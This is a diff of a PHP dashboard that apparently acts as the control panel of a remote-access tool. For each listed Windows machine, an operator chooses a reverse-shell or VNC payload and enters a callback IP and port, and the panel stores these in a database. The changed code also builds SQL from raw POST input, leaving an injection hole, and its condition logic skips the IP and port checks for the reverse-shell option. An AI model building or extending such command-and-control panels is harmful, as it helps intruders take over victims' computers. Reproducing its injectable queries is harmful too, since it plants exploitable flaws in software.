@@ -242,28 +242,23 @@ $stmt->execute([$payload]);
                                                     </select>
 
                                                     <input type="submit" value="Go" title="valider" /><br>
-                                                    <input type="number" name="port" value="Port :">
+                                                    <input type="number" name="port" value="Port :" size="6">
+                                                    <input type="text" name="ip" value="IP :" size="12" >
                                                     </form>
                                                
                                                 </p>
                                                 
                                                 <?php
-                                                    if ($_POST['payload'] == 'reverseshell')
+                                                    if ($_POST['payload'] == 'reverseshell' || $_POST['payload'] == 'vnc' && $_POST['ip'] != 'IP :' && !empty($_POST['port'])  )
                                                     {
-                                                    //echo $_POST['port'];
+                                                    $concat = $_POST['payload'] . " " . $_POST['ip'] . " " . $_POST['port'];
+                                                    //print_r($concat);
                                                     $pdo = conn();
-                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'reverseshell', port_payload = '".$_POST['port']."' WHERE id = 1;");
+                                                    $stmt = $pdo->prepare("UPDATE user SET payload = '" . $concat ."' WHERE id = 1;");
                                                     $stmt->execute();
 
                                                     }
                                                     
-                                                    if ($_POST['payload'] == 'vnc')
-                                                    {
-                                                    $pdo = conn();
-                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'vnc', port_payload = '".$_POST['port']."' WHERE id = 1;");
-                                                    $stmt->execute();
-
-                                                    }
                                                 ?>
                                                 </td>
                                                 <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
@@ -290,26 +285,22 @@ $stmt->execute([$payload]);
                                                     </select>
 
                                                     <input type="submit" value="Go" title="valider" /><br>
-                                                    <input type="number" name="port1" value="Port :">
+                                                    <input type="number" name="port1" value="Port :" size="6">
+                                                    <input type="text" name="ip1" value="IP :" size="12">
                                                     </form>
                                                
                                                 </p>
                                                 
                                                 <?php
-                                                    if ($_POST['payload1'] == 'reverseshell')
+                                                    if ($_POST['payload1'] == 'reverseshell' || $_POST['payload1'] == 'vnc' && $_POST['ip1'] != 'IP :' && !empty($_POST['port1'])) 
                                                     {
+                                                    $concat = $_POST['payload1'] . " " . $_POST['ip1'] . " " . $_POST['port1'];
                                                     $pdo = conn();
-                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'reverseshell', port_payload = '".$_POST['port1']."' WHERE id = 2;");
+                                                    $stmt = $pdo->prepare("UPDATE user SET payload = '" . $concat ."' WHERE id = 2;");
                                                     $stmt->execute();
 
                                                     }
-                                                    if ($_POST['payload1'] == 'vnc')
-                                                    {
-                                                    $pdo = conn();
-                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'vnc', port_payload = '".$_POST['port1']."' WHERE id = 2;");
-                                                    $stmt->execute();
-
-                                                    }
+                                                    
                                                 ?>
                                                 </td>
                                                 <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
@@ -336,26 +327,22 @@ $stmt->execute([$payload]);
                                                     </select>
 
                                                     <input type="submit" value="Go" title="valider" /><br>
-                                                    <input type="number" name="port2" value="Port :">
+                                                    <input type="number" name="port2" value="Port :" size="6">
+                                                    <input type="text" name="ip2" value="IP :" size="12">
                                                     </form>
                                                
                                                 </p>
                                                 
                                                 <?php
-                                                    if ($_POST['payload2'] == 'reverseshell')
+                                                    if ($_POST['payload2'] == 'reverseshell' || $_POST['payload2'] == 'vnc' && $_POST['ip2'] != 'IP :' && !empty($_POST['port2']) )
                                                     {
+                                                    $concat = $_POST['payload2'] . " " . $_POST['ip2'] . " " . $_POST['port2'];
                                                     $pdo = conn();
-                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'reverseshell', port_payload = '".$_POST['port2']."' WHERE id = 3;");
+                                                    $stmt = $pdo->prepare("UPDATE user SET payload = '" . $concat ."' WHERE id = 3;");
                                                     $stmt->execute();
 
                                                     }
-                                                    if ($_POST['payload2'] == 'vnc')
-                                                    {
-                                                    $pdo = conn();
-                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'vnc', port_payload = '".$_POST['port2']."' WHERE id = 3;");
-                                                    $stmt->execute();
 
-                                                    }
                                                 ?>
                                                 </td>
                                                 <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
@@ -382,26 +369,22 @@ $stmt->execute([$payload]);
                                                     </select>
 
                                                     <input type="submit" value="Go" title="valider" /><br>
-                                                    <input type="number" name="port3" value="Port :">
+                                                    <input type="number" name="port3" value="Port :" size="6">
+                                                    <input type="text" name="ip3" value="IP :" size="12">
                                                     </form>
                                                
                                                 </p>
                                                 
                                                 <?php
-                                                    if ($_POST['payload3'] == 'reverseshell')
+                                                    if ($_POST['payload3'] == 'reverseshell' || $_POST['payload3'] == 'vnc' && $_POST['ip3'] != 'IP :' && !empty($_POST['port3']) )
                                                     {
+                                                    $concat = $_POST['payload3'] . " " . $_POST['ip3'] . " " . $_POST['port3'];
                                                     $pdo = conn();
-                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'reverseshell', port_payload = '".$_POST['port3']."' WHERE id = 4;");
+                                                    $stmt = $pdo->prepare("UPDATE user SET payload = '" . $concat ."' WHERE id = 4;");
                                                     $stmt->execute();
 
                                                     }
-                                                     if ($_POST['payload3'] == 'vnc')
-                                                    {
-                                                    $pdo = conn();
-                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'vnc', port_payload = '".$_POST['port3']."' WHERE id = 4;");
-                                                    $stmt->execute();
-
-                                                    }
+                                                     
                                                 ?>
                                                 </td>
                                                 <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
